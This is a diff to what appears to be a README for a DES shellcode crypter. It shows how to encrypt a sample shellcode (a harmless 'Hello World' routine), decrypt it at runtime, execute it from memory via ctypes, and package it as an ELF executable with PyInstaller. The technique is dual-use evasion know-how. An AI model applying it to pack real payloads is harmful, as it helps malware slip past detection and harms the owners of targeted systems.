@@ -1,13 +1,13 @@
 1.Install PyInstaller :
- 	git clone git://github.com/pyinstaller/pyinstaller.git
+$ git clone git://github.com/pyinstaller/pyinstaller.git
  	
 2. Get a shellcode :
-  ./get_shellcode.sh hello_shellcode
+$ ./get_shellcode.sh hello_shellcode
   \x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80
 
 3. Encrypted the shellcode with a secret key (Ejm abcdefgh).  
 
-python DES_Crypter_shellcode.py abcdefgh
+$ python DES_Crypter_shellcode.py abcdefgh
  [*] DES CRYPTER SHELLCODE
  [*] ---------------------
  
@@ -43,4 +43,5 @@ memorywithshell = create_string_buffer(decrypt_shellcode, len(decrypt_shellcode)
 shell = cast(memorywithshell,CFUNCTYPE(c_void_p))
 shell()
 
-5. Generate a elf executable 
+5. Generate a elf executable with PyInstaller :
+$ python2.7 pyinstaller.py DES_Decrypter_Shellcode/DES_Decrypter_Shellcode.spec
